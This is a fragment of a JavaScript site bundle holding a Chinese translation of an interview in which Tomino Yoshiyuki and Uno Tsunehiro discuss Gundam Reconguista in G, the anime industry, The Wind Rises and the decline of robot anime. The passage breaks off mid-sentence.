var route_5 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod27
});

var Mod28 = {"title":"鋼彈 Reconguista in G 富野由悠季x宇野常寬 特別訪談","slug":"ACG-reconguista-in-g-interview","html":"<h2 id=\"完成新的「鋼彈」之後\">完成新的「鋼彈」之後……</h2>\n<p>◆ 富野：今天請多關照。對於還記得多少作品裡的內容，我還是有點沒自信啊。</p>\n<p>◇ 宇野：因為我才剛剛看完，所以還記得很清楚呢（笑）。</p>\n<p>◆ 富野：您看的是在電視上放送的版本吧。</p>\n<p>◇ 宇野：是的。</p>\n<p>◆ 富野：其實，因為當時不知道要寫到什麼地步才好，所以現在進行中的 BD 版和 DVD 版的製作中，有不少修改。</p>\n<p>◇ 宇野：誒？都修改了哪些內容呢？</p>\n<p>◆ 富野：主要是把攝影處理和 BGM、效果音等的配樂處理做了全面的修改。畢竟很遺憾，放送版中一直到大概 20 話左右的配樂工作，我都沒有參與進來，因此一些很基本的計畫有一半沒能傳達過去。所以，從放送版中，只能看到作品的氣氛和故事的構造的一半左右，並不有趣是吧？</p>\n<p>◇ 宇野：老實說，一直到故事的中盤，都很不好懂。可是，20 話以後一口氣灌入了龐大的情報量，令人目不暇接的感覺十分有趣，不由得想到，為什麼不從一開始就按照這個節奏進行呢。反過來說，在看到包括了未整合的，龐大但分散的要素的影像時，才開始覺得終於明白了 G-RECO 的概念了。</p>\n<p>◆ 富野：不是沒有去做，而是沒法去做。因為現實的情況是，在配音的階段，有一半以上的畫面都還沒完成，只是用分鏡來進行攝影，所以就算對各話的擔當演出說「搞明白我的構成啊！」也是沒有辦法的事情。</p>\n<p>◇ 宇野：20 話以後的內容如果在 3 話或者 4 話的時候就表現出來的話，我覺得就會變成完全不同的作品了。那麼，變成現在這樣的原因是什麼呢？</p>\n<p>◆ 富野：因為我有超過十年沒有在現場工作了，已經完全不知道在錄音室裡應該怎麼指揮了，所以開始的時候就全部交給錄音室那邊。但那邊又弄了一些多餘的事情，要到 5、6 話左右才讓他們停了下來。</p>\n<p>◇ 宇野：也就是說，是實務性質的，錄音室作業方面的問題吧。我還以為這 10 年間，富野先生已經下定決心要與現場保持距離了呢……</p>\n<p>◆ 富野：不，沒有這回事。因為必須要繼續這份工作，在看到宮崎駿先生一邊在繼續創作，創作過程中既可以保持對現場的控制，也能把自己的風格灌輸到現場中，從而可以做成自己希望做成的樣子時，就覺得宮崎駿先生真是厲害啊。於是就痛感到，10 年沒做現場工作的自己居然會變得如此無能這個事實了。</p>\n<p>◇ 宇野：可是，因為日本的動畫產業已經過度進化了，恐怕也有著失去了自己正在創作影像作品這種意識的問題吧？</p>\n<p>◆ 富野：正是如此。我沒想到自稱「演出」的人們，居然對動畫的特性無知到這個地步。他們以為，10 年沒有幹過這種事的老人只會閉上嘴在後面老老實實地看著。他們還以為，一直在現場進行工作的工作人員們毫無疑問是居於高位的。可是實際上，各話的擔當演出根本不知道什麼是演出，一旦把分鏡工作外包給外部的工作人員，那就只能提交上還不如外行人的分鏡稿。在我想這種奇妙的事情到底是怎麼回事時，有一個現場的工作人員對我進行了說明。他是負責畫分鏡的人，可是當他把分鏡稿交給我時，卻說道：「全部修改一遍吧。我已經有十幾年沒做過這種水平的劇本的工作了，真不知道應該怎麼辦。」根據他的說法，現在的動畫，只要由出版社做主導，把漫畫再現出來就好了。他說，他被教育道，除此之外的事情絕不能做。他還跟我說，在這十幾年裡面，他已經被使用這種體制的深夜動畫所毒害了。所以被告知不是做有漫畫的原作，而是做像是原創電影一般的作品時，馬上就變得無從下手了。問題是，對我道歉了的他也算是把形式上的分鏡稿給完成了，但更可怕的是，有許多做的更爛的人們，卻自以為做的很好。最後，分鏡稿的絕大部分的修正，都是由我進行了幾乎完全的重畫，於是我對作品也就無法完全控制了。</p>\n<p>◇ 宇野：深夜動畫的世界，在這十年裡一直都是這個樣子呢。在製作者和粉絲之間，確立了太多為了理解動畫而形成的符號化的東西，故事的安排也有了很大的變化。比如說，在故事裡登場的某個角色，如果被加上「有一個曾經交往過的男朋友」的描寫，那麼狂怒的粉絲就會把其周邊商品付之一炬之類的。結果，製作方要組織安排故事的餘地就很小了，觀眾要得到自己解釋的餘地也消失了。</p>\n<p>◆ 富野：所以就直接照搬漫畫的內容了嘛。而這樣的問題就是，當我看見畫背景畫的工作，想到「為什麼現在的人變得這麼不會畫畫呢？」時，就被告知說，「我們已經有十幾年沒負責過畫設定這種工作了。」也就是說，只要直接全部重抄一遍漫畫的內容就可以了，不再會去添加什麼東西，或者甚至已經不會去想要考慮什麼事情了。</p>\n<p>◇ 宇野：那正是現在的市場所需求的東西呢……</p>\n<p>◆ 富野：我也知道這一點，可是，就涉及到讓角色動起來，這種原本意義上的演出論而言，那些根本不知道自己只是無能的演出家的人們，他們所畫出來的分鏡，可說是爛到足以令人驚愕。比如說，只要角色坐在駕駛艙的座位上，那麼角色的屁股就會一直粘在座位上，像這樣的分鏡也可以若無其事地畫出來。由這些分鏡所產生的問題，會波及到各個方面。比如說，有一次我在後來才注意到一個很嚴重的紕漏，就問他們說，「這不能想點辦法嗎？」，而回答則是「作畫已經推進到一半了，已經沒辦法了。」當我詢問負責演出的人「不覺得這很奇怪嗎？」時，回答是「雖然也覺得有點奇怪啦……」，沒了。他們完全沒考慮過作為演出家應該要去處理一下。像是這種讓我束手無策的情況，這一次有相當多。</p>\n<p>◇ 宇野：可是，與其說那是 G-RECO 製作的問題，倒不如說是現在的日本動畫業界所存在的問題呢。</p>\n<p>◆ 富野：正是。可是反過來說，現役的製作人員也有很多優點。特別是在 40 歲後半到 50 歲前半的動畫製作者們裡面，我發現還有著比我想像中還要更加用心地完成工作，並未對深夜動畫的現狀習以為常的人們。所以，這些有著二十到三十年工作經驗的動畫製作者們，充滿興趣地完成了 G-RECO 的工作，我不由得想到，在今後十年裡，必須要繼續製作可以讓他們展現才華的作品。雖然現在距離放送結束已經超過一個月了，但我在稍稍回顧 G-RECO 之後，就覺得應該可以再把 G-RECO 做得更像是一部動畫，哪怕是俗稱的所謂再編集版也可以，也希望把這部作品再做一次。而現在我就是認真地在進行這個工作。</p>\n<h2 id=\"角色的情感不會說謊\">角色的情感不會說謊</h2>\n<p>◇ 宇野：我還有一個想法，那就是作為觀眾是不是也必須要改變呢。比如說，現在在網絡檢索 G-RECO 的話，就會看到許多「看不懂」的評論。這個看不懂有兩種意思，其一是富野先生剛剛所說的，演出的工作人員無法很好地處理這些情報量，導致理解困難。其二恐怕就是觀眾的問題了。若不是從一開始就整理得讓人容易理解，就不能留下印象；光是看動畫時需要思考，就已經感到不愉快，像是這樣的觀眾是不是變多了呢？</p>\n<p>◆ 富野：完全就是這樣！雖然我也已經預想到會被評價說看不懂了，但實際被這樣說的時候還是會感到沮喪。可是我在很久以前，就已經體會過和這種沮喪感非常接近的經驗了。那就是從機動戰士鋼彈（元祖鋼彈）放送完成到劇場版上映的那一年間。在那期間，我們簡直就是眾矢之的。</p>\n<p>◇ 宇野：那是因為 TV 版收視率不佳而被腰斬這件事嗎？</p>\n<p>◆ 富野：那也是一個原因。因為是腰斬完結的，所以現在的「看不懂」，在三十多年前就被許多相關人士說過了，我也明白了，所謂大人，就是大家都會做同樣的反應。既然如此，那麼我就乾脆這麼想，製作讓愚蠢的大人看明白的動畫也就毫無必要了。</p>\n<p>◇ 宇野：而且那不僅是在日本的動畫界，全世界都有這樣的趨勢，如果去看看好萊塢的熱門電影排行，就會發現只有 CG 動畫和特技電影了。不論是好是壞，我覺得現在要想傳播到全球，那就必須是脫離現實的空想故事了。要是歷史性的，或者是社會性的內容被突出來的話，其受眾面就會變得狹窄。另一方面，把劇情片做成動畫而失去的現實性，則被通過 YouTube 瘋狂傳播到全世界的外行人的自制影片所繼承了。雖然這也是沒有辦法的事情，但這樣的話，就不由得想到，20 世紀的影像作品，特別是劇情片所繼承的「通過故事而去意識到廣闊的世界」這樣的表現手法將何去何從呢？由好萊塢的製作者們所制作的電影，為了容易理解而與現實徹底割離，現實性變得只存在於更為個人的 YouTube 裡了。</p>\n<p>◆ 富野：變成這樣，那是把作品向公眾發表時的問題。我認為無論是出版物還是影像作品都是一樣的。這樣說可能會顯得好像是上了年紀的人所說的話，但是，令人愉快的作品和教育意義的作品同時存在也很好啊。正因為這樣，我會想要把 G-RECO 以更好的樣子再做一次，現在也正與主要的製作人員們一起，商討再編集的時候怎麼做才會更好。</p>\n<p>◇ 宇野：這樣的話，關於故事我有很多事情想要問。最初吸引我的，那就是作為把富野先生一直到 TA 鋼彈為止的所有作品都看過的人，在看到標題是「reconguista」的時候，就會很理所當然地以為，主人公們是身在金星，抱有著想要從金星回歸地球這一不被年輕人所理解的想法的老頭子們。於是，就會想搞清楚為什麼他們會想回歸呢，我就感覺像是這樣的故事會比較自然。另一個可能是非常根本性的問題，為什麼主人公是貝爾利和愛達他們呢？</p>\n<p>◆ 富野：關於貝爾利和愛達，我會想，如果把他們描述得可以讓觀賞的孩子們更能夠有代入感那就好了，確實是這樣。</p>\n<p>◇ 宇野：我還以為富野先生已經不想講述那些從和自己差不多的大人或老人開始的故事了呢？</p>\n<p>◆ 富野：也有那方面的原因，但還有一個問題。從企畫階段，就已經想像到會有好的方面和不好的方面，但因為我想把我對宇宙電梯的討厭放在最開始的部分，而且也不能繞開對現在這樣的宇宙開發表示反對的態度，所以就堅持要讓故事從宇宙電梯所在的地球開始了。</p>\n<p>◇ 宇野：原來如此</p>\n<p>◆ 富野：這不是動畫的問題，而是現實性的問題，源自不希望愚蠢的人們繼續把稅金用在這上面的想法。</p>\n<p>◇ 宇野：可是我不認為現在的主流世代有如此關心宇宙哦。會考慮前往宇宙後人類會變成什麼樣子的人基本都沒有了。現在的人大概只會想著，談論宇宙之類的大話題，只會在網絡上顯得很浪漫主義而已。</p>\n<p>◆ 富野：正因為如此，所以我才要把這個問題好好地用畫面表現出來，灌輸給 10 歲前後的世代們。所以，我認為這就是切入 G-RECO 的故事最好的方式了。因為我想要從現實來展開故事，所以對這個故事造成了約束，這也是事實。</p>\n<p>◇ 宇野：可是，我認為這種現實性正是 G-RECO 的重點。我一開始時，把第一話和第二話一起看了，直白地說，感覺就是，啊，富野由悠季故意找好萊塢的茬啊，的樣子（笑）。本來，電影就是為了共享一個現實而發展起來的裝置。在我們所生活的這個現實裡面，這個世界並不存在能夠整理、記述我們的事情的上帝視角。各個個體的體驗是分散的，乖離的。相對的，劇情片所描繪的世界，通過作者所整合的視點進行了整理。20 世紀可以說是這樣的一個時代，三次元的現實體驗（現實），若是不能理解地方性的傳統就難以共有，可是整理成為二次元的畫面（現實性）的話，就可以為廣闊的社會所共有。媒體正是利用這一點得以蓬勃發展。在這個意味上，對作者來說沒有任何意義的東西就絕不會出現在畫面上的動畫，就有著得到了最好的整理，最好的整合的現實性。因此現在只會製作動畫和特技電影的好萊塢，正是利用了這種力量，在全球量產著他們的作品。可是，在這其中，富野由悠季利用基本上就是在找茬一般的動畫，而且還是幻想故事，來特地模擬著乖離的現實世界。</p>\n<p>◆ 富野：我對此有著充分的自知之明。可以說，正因為有自知之明，所以我更加必須把 G-RECO 的作品構造和世界觀做成這個樣子。雖然說出來就是謊話連篇，但是我確實是想著，這麼做的話大概就會比較容易懂吧，然後試著做了出來後，發現至少第 20 話之後，就發現作為動畫來說還是做得挺不錯的。</p>\n<p>◇ 宇野：這真是很諷刺呢。本來動畫應該是整理得最好的影像作品，應該無論如何都成為一個有條理的的世界才對，G-RECO 卻故意地破壞了這一點。現在，實拍電影所擁有的，反映現實中模糊部分的能力，已經被市場所否定，失去了容身之所。與之相反，富野由悠季則是利用本應描繪最有條理的現實，最有條理的世界的動畫，故意地描寫了比現實還要破碎的事情。對我來說，這種諷刺正是 G-RECO 最為尖銳的地方。</p>\n<p>◆ 富野：沒錯，動畫的表現力，本來應該是非常優秀的才對。G-RECO，特別是在最後 5 話部分的地方，能夠像那樣在不同的舞台來去自如，正是動畫的優秀的證明。關於如何把影像作品表現得如同電影一般，我在負責這次 G-RECO 的演出的時候，比元祖鋼彈的時候還要更加意識到這一點。那就是，無論情節如何紛亂，但這個故事還是想一口氣看下去的感覺（それは、事象があちこち飛んでも、話として一気に見られるものにしたかったということなんです）。我是非常意識到這點的同時，進行製作的。為此應該要怎麼製作呢，那就是很簡單的事情，只要讓角色們的情感全部都保持前後統一地推進故事就可以了。唯獨角色的情感反應是不會說謊的。這樣的話，故事就會紛亂地推進下去（そうすると、話があちこち飛べる）。注意到了這一點的電影人，現在可不多啊。</p>\n<p>◇ 宇野：確實，感覺富野先生現在似乎在做和元祖鋼彈時相反的事情。在元祖鋼彈的時候，「去看片你就懂了！」都成為您的口癖了。在那個時候，您是在製作看片就能懂的東西，擴展著動畫的可能性。換句話說，我認為，您想著不能只讓星球大戰做得到這一點，於是就有了元祖鋼彈。要說，這裡面有什麼演出是連喬治•盧卡斯都做不到的的話，那就是，比如說，在對話途中突然切換鏡頭，而且還是彷彿在感情層面上有所聯繫的，話劇風格的台詞中突然切換，這種在幻想劇中有一部分現實混入其中的現實性的演出。然而到了 G-RECO 卻是反過來，切換成了從頭到尾都是用和現實同樣的乖離的視角來進行描寫，而且在畫面推進過程中，不加整合，而是毫不在意地保持著那種乖離性的演出方式。這樣子光是看片是絕對看不懂的。故意做成了必須要好好地去感受，好好地去思考才能明白的樣子。這種方法論上的逆轉，是富野先生心境上的變化呢，還是時代的要求呢？</p>\n<p>◆ 富野：可以說這是時代的要求。實際上，我也多少感覺到了，動畫和電影已經變了。可是，還有一點，或許不應該說，然而年紀大了之後，就會產生這樣的感覺，「說不定我做得到啊！」之類的。那麼回到之前的話題，談到與演出相關的事情，這是一種如果自己沒有相應的自覺的話，就做不成的工作。動畫師的工作，只是單純地把在鏡頭中出現的事物的反應，用自己認為理所當然的部分熟練地補完。他們所熟練的部分，若與我們所想的東西存在同步之處，那麼就能正確地接受你的工作了。所以，今後必須要加以注意的，乃是有人有著許多長處，同時也有人是相當地無可救藥，這些區別位於許多不同的地方。我正是在同時涉足了這兩個方面之後，就再次想著只能把 G-RECO 再用標準的方式製作一遍了。這些東西，用現在這樣的說法的話可能不好理解，若是要舉出例子的話，像是宮崎駿先生的《起風了》那樣的作品到底是什麼樣子的呢？重新思考一下，就可以明白我的意思了。《起風了》是「過去論」。因為是回憶過去的故事，所以做成那種形式就好，可是動畫並不是實拍的，我認為事到如今已經沒有必要用來製作回憶過去的故事了。所以，G-RECO 在這個大方向上是沒錯的。這種在意思上的相反的意識，從製作開始的時候就已經有所自覺了。正因為如此，或許就可以理解為是時代的要求了。可是，由於有著剛剛所提到的糟糕的現實問題，若是讓我自己一個人來製作演出的話或許還能更加像樣，然而被徹底地拖了後腿，想方設法完成 26 話份量的分鏡，就已經把放送的時間全部花光了。結果完全沒空去做錄音室裡的導演工作，就以那個樣子完成了。</p>\n<p>◇ 宇野：《起風了》因為是講述零戰的故事，也很具象徵性意味呢。就像是在敘述著日本動畫從與好萊塢和迪斯尼對抗為開始，最終走向結束的樣子。結局，日本的動畫可能也像是零戰那樣，雖然想用粗暴的飛行來證明自己性能的優秀，但最終還是無法取得勝利。</p>\n<p>◆ 富野：雖然你說的很對，但關於《起風了》，我的評價比宇野先生的要高許多。對於像我這樣喜歡飛機的人來說，《起風了》不止是零戰的故事。可以斷言，像這部電影那般正確地描繪了航空史的電影是絕無僅有的。而在現實性的意義來說，也是非常出色的電影。然而，包括以上這些優點，這也都是過去論。所以，儘管對於飛機愛好者來說，這是部值得去愛的電影，但我卻沒辦法對普通人推薦。</p>\n<p>◇ 宇野：可是，我並不是很喜歡那個結局，就是主角的太太的幽靈冒了出來，說著「活下去」的那裡。那是扯淡的吧。實際上只能就那樣死去了。宮崎駿先生也知道那之後什麼都沒有了。畢竟，他的工作室也解散了。</p>\n<p>◆ 富野：當然，在那方面的現實主義去考慮的話，可以說他們真的是做了很過分的事情。</p>\n<p>◇ 宇野：可是，富野先生很討厭像那樣說著漂亮的謊言死去的樣子吧。</p>\n<p>◆ 富野：我可做不到呢。我可沒有宮崎先生那樣的學識和能力。也就是說，當我想，有著才能與能力的人，他們的實力是在什麼方面施展開來的時候，就驚恐地發現，那是發揮在在如何把過去更加美好地敘述出來的時候。我沒有那種基礎的學力，所以做不到這點。所以我才會像現在這樣，去想著根本不曉得是怎麼回事的，一千年啊兩千年之後的世界呢。這就是所謂差生的嘴硬吧（笑）。</p>\n<p>◇ 宇野：現在好萊塢已經變了，曾經是假想敵的迪士尼也有了很大的變化。我認為，宮崎駿先生在這種時候，就認為應該為自己的人生做一個收尾了，便決定封筆了吧。</p>\n<p>◆ 富野：我認為這種感觸是對的。可是，作為同世代的同業者，我對於《起風了》這樣的總結性的作品，還是抱著感激之情。可是，對於幫助完成這部電影的年輕人來說，也有著感到抱歉的心情。對於想要從此靠動畫來生活下去的工作人員們，我想，當他們想要進行樂在其中的工作時，能夠把 G-RECO 這樣的作品，做成面向孩子們的動畫就好了。</p>\n<p>◇ 宇野：您認為，到那個時候，就沒必要回應那些說著「劇情好複雜」、「情報量太多了」而看不懂的人們了嗎？</p>\n<p>◆ 富野：當然沒有了。我雖然還沒看《冰雪奇緣》，但這部電影中把樂曲融入其中的手法，簡直是優秀得令我感到不甘心。我真是想把這部分的內容，以職業級的手法也做到像是 G-RECO 之類的動畫裡面去。</p>\n<h2 id=\"今後手繪動畫將會變得珍貴\">今後手繪動畫將會變得珍貴</h2>\n<p>◇ 宇野：我還注意到一點，是和女主角愛達有關的。我一直到第 22 話，她從金星回來時，在船上打壁球為止，都沒辦法喜歡上這個角色。但是當我看到愛達一邊哭著一邊打壁球的時候，就明白到，啊，這孩子原來有著這樣過分認真的一面啊，之後才覺得我開始跟上故事了。</p>\n<p>◆ 富野：我還是第一次聽說這種意見呢。可是，我也同意你。G-RECO 是因為想要和孩子們取得共鳴，所以才在講述愛達與貝爾利的故事。可是，到最後這反而在編劇上成為了最隨便的部分。也有人說，如果在再編集的時候不好好處理這一部分的話，整個故事就凸顯不出來了。關於愛達，確實如你所言，但在此之前，我對於愛達，犯下了一點錯誤。那是和她男朋友卡希爾有關的內容。因為角色人設在完成時時間已經很緊了，無論滿不滿意都必須要用上。在那個時候，我看見卡希爾的人設時，就想到，啊，這廝和愛達睡過了啊。於是就開始有點不喜歡愛達了，所以就會對她有一些隨便來的內容（笑）。</p>\n<p>◇ 宇野：在我看來，富野先生對愛達的描寫，完全不像是在描寫一個好女人的感覺啊（笑）。</p>\n<p>◆ 富野：啊，一直到 3 話左右還是想描寫一個好女人的。可是在進入作畫之前，看到卡希爾的形象，就會先入為主地向，這個死帥哥鐵定從一開始就和愛達睡過了啊。</p>\n<p>◇ 宇野：從男性的角度來看，身邊彷彿就會有像卡希爾這樣的傢伙，有點討厭呢。不用像偶像那樣獻媚就能受歡迎，這真是最討厭的類型呢（笑）。</p>\n<p>◆ 富野：雖然有著愛達這樣有問題的角色，但整體來說，我認為這次的角色們還是很不錯的。比如說，在巨獸（メガファウナ）上操舵的斯蒂爾。人設很好，聲優則讓偶然遇到的懂得雙語的孩子。多虧了她，成為了一個很用心的角色。只要喜歡上了這個角色的話，就能像這樣進行創作了。可是，對愛達還是沒能做到這一點。</p>\n<p>（特地附上一點註釋：斯蒂爾的 CV，ミシェル•ユミコ•ペイン小姐是澳日混血，出生於澳大利亞的墨爾本，自小在夏威夷和日本長大。本職是歌手，現在和大森隆志一起活動，她的一些信息也是大森的博客裡登載的。富野在放送前端採訪裡也似乎有提到她，說是一個有著特別聲音的人，給予了高度的評價。）</p>\n<p>◇ 宇野：富野先生似乎對貝爾利也不怎麼喜歡呢。</p>\n<p>◆ 富野：對。所以我很困擾啊。</p>\n<p>◇ 宇野：可是，把貝爾利弄成像現在這樣不得要領的角色，是明知故犯的吧？</p>\n<p>◆ 富野：應該說，我只能做成這個樣子。為什麼貝爾利會變成那樣，我也不知道。正因為這樣，才不得不需要像宇野先生這樣的人來給出意見呢。</p>\n<p>◇ 宇野：我覺得富野先生正處於對年輕男性沒什麼興趣的時候呢。</p>\n<p>◆ 富野：也有這種原因呢。我對於現在的十來歲，二十來歲的世代相當的不信任，不認為他們是令人心情愉悅的青少年。可是，多虧我有了兩個孫子，讓我對孩子們的觀點有了相當程度的中和。也是多虧了我的孫子，讓我明白到，必須要重視青少年的時代，也必須對青少年保持興趣，雖然要靠孫子來明白這一點總覺得有點不對……</p>\n<p>◇ 宇野：還有一個理由，那大概就是機器人動畫正在變成不屬於青少年的東西了。雖然要我在日昇的工作室的會議室裡說這個，需要一點勇氣呢……</p>\n<p>◆ 富野　肯定是這樣。在這種意義上，可以說機器人動畫已經完全成為了衰退產業了吧。雖然我沒有看，但是好像有一個是用鋼彈的塑料模型戰鬥的作品吧？</p>\n<p>◇ 宇野　是說《鋼彈創戰者》吧。</p>\n<p>◆ 富野　都說那是面向孩子們的作品，我對此不能理解。我只感到那是為了市場，也就是說因為大人的原因而製作的作品。我不認為單純只是內容簡單淺顯的作品就是面向兒童了，而是希望能夠製作出給予對未來有著遠大志向的人們，就像是我在元祖鋼彈時代遇到的人們那樣的，能夠給予他們刺激的作品。</p>\n<p>◇ 宇野：可是，要對富野先生說這樣的事情雖然有點奇怪，所謂戰後的機器人動畫，真要說的話，也不過為了滿足市場需求的亂戰而已吧。</p>\n<p>◆ 富野：沒錯</p>\n<p>◇ 宇野：在戰後，日本的文化空間裡，不允許正面描繪暴力，和戰爭那糟糕的地方了。可是，面向孩子們的動畫，而且還是利用機器人這種方便的設定的話，就可以描寫了。換句話說，只有動畫能夠以越過教科書式的原則問題的程度，描寫暴力、戰爭、以及對這些事物的情感。正因為如此，動畫才在這幾十年裡成為了反映日本人自我意識的影像作品。可是，這個使命已經結束了。已經再也不需要借助機器人設定的方便了，但是在過去喜歡富野先生你們這一代人所制作的動畫的人們，現在也還在繼續製作這樣的作品，這讓我很在意。</p>\n<p>◆ 富野：在這種意義上，「巨大機器人作品」這個種類自身也已經變成了古老的東西了呢。所以，我才有著必須要有更多幻想的部分這樣的意識，這讓我構築了像這次這般的世界觀。所以，最不好的就是我對屬於現實問題的宇宙開發問題所保持的意識。我也不是沒有覺得這點對我造成了妨礙。另外還有一個麻煩事。那就是中央塔和中央特區，以及亞美利亞這兩個有具體名稱的巨大組織的問題。關於組織的成立，和組織之間的摩擦衝突，這種絕對無法控制的問題，我本想再多觸及一點的。這與現在的國家論也多少有所關連，讓我無論如何都想要加進去，這就對故事造成了妨礙。</p>\n<p>◇ 宇野：這也是現在在購買元祖鋼彈的 BD 的三十幾、四十幾歲的人們，最不想看到的事情呢。他們在小學生和中學生的時候就看元祖鋼彈，憧憬著得到了巨大身體的少年兵那和大人們一起奮戰的身姿。可是，現在反過來，自己成了三十多、四十多歲的人，比如說，最典型的《機動戰士鋼彈 UC》的故事裡面，吉恩公國的殘餘、聯邦的大人物，對身為主角的少年做著「我們當年努力過了」的說教。四十多、五十多歲的大叔對主角流著淚進行說教，然後作為主角的少年也很感動，就在戰場稍稍活躍了一下，這種事情不斷重複，就組成了這部作品的故事。我覺得，那就是，當年看著元祖鋼彈長大的那個世代成為了大叔，得到了一定程度的社會地位，有了老婆孩子，同時也放棄了一些東西的時候，剩下還有什麼想要的話，那就是能夠乖乖地聽自己一邊流淚一邊講述過去故事的，像是新人員工這樣的東西了。所以我認為，在這個意味上，機器人動畫的使命已經結束了。那是在扭曲的戰後社會裡，向不知道要如何成為男子漢的男孩子們，笨拙地展示成為男子漢的方式的東西。</p>\n<p>◆ 富野：作為過去論而言，這是非常正確的見解，我自己也有著同樣的感受。也就是說，全部都是過去的事情了。</p>\n<p>◇ 宇野：就是這樣。把少年的成長願望寄託在機器人動畫的時代，已經結束了呢。</p>\n<p>◆ 富野：現在，要製作讓觀賞的大人們能看懂的動畫，用十分簡單的話來表達的話，那就是自慰吧。我不知道那有什麼爽的，本來動畫也不應該是這樣。我現在完全沒興趣製作像是在自慰的作品。更何況是要面向公眾發表的作品。</p>\n<p>◇ 宇野：我認為，富野先生在《機動戰士 Z 鋼彈》之後，把鋼彈系列做成那個樣子的故事，也是因為您所抱有的機器人動畫的使命什麼的正在結束的自覺，在 80 年代、90 年代的時候變強了吧。</p>\n<p>◆ 富野：如果要說理想論的話，我是想推進到創作文藝作品的領域裡去的。只是，覺得自己要是製作出了像是《起風了》這樣的作品就會成為作家了，這種思想非常危險，而且也覺得這大概是不對的。所以，我到死為止，都不曉得自己應該做出什麼樣的作品。</p>\n<p>◇ 宇野：與其說機器人動畫，不如說，是只能終結掉所有戰後動畫吧。</p>\n<p>◆ 富野：雖然我對此有所意識，可是我有著只能被要求製作機器人作品的桎梏，而且，試著給機器人作品多增加一點幻想色彩，這樣的作品才可能能夠在日昇裡製作。這樣的話，就要思考並非在好萊塢創作的愚蠢故事，而是應該在東京創作的故事。通過這次的 G-RECO，另一個確認到的事情是，手繪動畫毫無疑問會保留下來。很奇怪，在好萊塢，越是廣泛地運用 3D 製作，手繪動畫反而就變得珍貴了。我認為有必要存在讓現在 10 歲以下的時代明白這種珍貴程度的作品。於是我就讓製作 G-RECO 的中堅動畫師們在製作的時候進行手繪。因為有了這樣的目標，所以我在想，大概還能在努力兩三年吧。</p>\n<p>◇ 宇野：若是用收穫來比較就會輸掉，所以就從播種開始的意思嗎？</p>\n<p>◆ 富野：沒錯。可是，我覺得我是因為有著這樣的職業生涯，所以才會想說出這樣的話。只是，我不想只是做播種的工作，還想要製作出，用比較通俗的話來說，能夠拿獎的作品呢。</p>\n<p>◇ 宇野：大家都在想，現在已經沒辦法做動畫了。宮崎駿因為戰後動畫的使命已經結束了而選擇封筆。押井守陷入了自我諷刺的含糊其辭。庵野秀明陷入了猶豫而不作動畫了。而且，下一個世代的作家們則是遵守著深夜動畫的教條，應付著各種情況而竭盡全力了。</p>\n<p>◆ 富野：一邊混飯吃，一邊應付著深夜動畫，還在進行創作，這本身作為生活的人來說，我認為已經很好了。倒不如說，能夠抱持著那麼多問題生活下去已經非常好了。重要的是，這之後要繼續到什麼時候呢？這是必須考慮的問題吧？</p>\n<h2 id=\"希望做出得到「動畫真厲害啊！」評價的作品\">希望做出得到「動畫真厲害啊！」評價的作品</h2>\n<p>◇ 宇野：至今為止，富野先生是不是都在有意迴避劇場版作品的問題呢？</p>\n<p>◆ 富野：這是很常見的誤解。但原因其實只是，像營業水平不足、或者氣量不夠，所以我才沒辦法去做而已。</p>\n<p>◇ 宇野：作為一個電影愛好者，我還是希望再看一兩部富野由悠季的兩小時原創作品呢。像是《傳說巨神伊迪安》的發動編，和《機動戰士鋼彈 逆襲的夏亞》這樣的作品，我認為這都是完全體現了富野由悠季演出論，戰鬥部分和戲劇部分完美結合，而且還相互加速的稀有的電影。一般來說，如果加入戰鬥部分，那麼戲劇的內容就會停滯，然而通過您的方法論，反過來還會推動戲劇加速。我認為這只有富野由悠季能過做到這一點。G-RECO 最後的幾話，也是這個方法論本身的體現。我真的很想再觀賞用這種製作方法創作的，兩小時左右的電影。</p>\n<p>◆ 富野：做不到這點的最主要原因，那就是自己缺乏這個能力了，但與此同時，我已經把機器人作品做到這個地步了，但還是沒有人關注我這方面的才能，這也是一個原因。</p>\n<p>◇ 宇野：所以，之後就一直在創作電視動畫？</p>\n<p>◆ 富野：變成這樣，也可以說是自己沒出息吧。可是，正因為會這麼想，所以才不希望把 G-RECO 當成自己的遺作。一方面，我希望到死都在繼續進行創作，而且到了那個時候，我希望能創作出讓 10 歲前後的孩子們感嘆「雖然不知道電影是什麼東西，但好厲害哦！」「動畫真厲害啊！」的作品。</p>\n<p>◇ 宇野：在戰後動畫數量不斷增長的趨勢中，富野先生們所提出的「存在著只有動畫才能描繪出的體溫和情感」這樣的命題，明顯地與實拍電影取得了距離。導演在一旁，演員們被攝影機所包圍，這樣的制度中存在著拍攝不到的東西，也存在著只有在 100%虛構出來的世界才能描繪出來的東西，於是戰後的動畫就被創作出來了。可是，曾經作為假想敵的實拍電影自身被迪士尼和 YouTube 所分解，開始對人類的大腦進行調教的現在，以實拍作為假想敵已經做不了什麼了呢。</p>\n<p>◆ 富野：我們已經突破了這樣的時代了。在創作 G-RECO 時所學到的另一個事情是，人類自古以來都是追求著「理想國」的「理想主義者」，如何應對「現實主義」的問題都放在了其次的位置。也就是說，「在與現實對決時總是處於後手」，這對我來說成了一個提示。雖然剛剛我用了自慰這樣的說法，但因為在我們的本性裡面，存在著想要進行更加舒服的自慰這樣的想法，於是就會享受創作出來的故事。讓我明白這就是人類本性的，是 E•H•卡爾所著作的《20 年危機》。我讀了這本書，就感覺對真正的人類不能理解了。通過學習我知道了，早在第一次世界大戰中，在歐洲這樣狹小的地方，就死了 400~500 萬人。我無法理解把這種悲劇持續了 4 年的人類的精神。可是，雖然我無法理解，但第一次世界大戰還是發生了。這場戰爭開始的兩年左右，士兵們都不是徵兵而來，而幾乎都是志願兵啊。志願兵們一批一批地來到戰場，以 10 萬人為單位死去。明知道是這樣的戰況，但還是志願地參軍。他們為什麼可以這麼做？其理由就是「對國家的義務感」。就憑這點就可以志願赴死。就憑這點就可以把自己的家人送出門。雖然有所謂名譽戰死的說法，但還是沒辦法理解僅僅因為名譽就可以讓兒子去送死的雙親的心理狀態吧？可是，第一次世界大戰就這樣持續了 2 年半，接近 3 年。我便無法理解可以把這樣的戰爭在歐洲那種狹小的地域反覆進行的人類。可是，只要我拼上自己的性命，德國就會得到新的正義吧，法國就會成為全新的國家吧，英國也會重新成為大不列顛。當我得知他們的動機就是這種理想主義時愕然了，但還是感覺可以接受了。我開始思考，當我們想著這樣的理想時，我們是不是就是一邊做著夢，一邊走上自我毀滅的道路呢。可是，若是講述絕望，那麼孩子們是不會來看的，所以我採用了 G-RECO 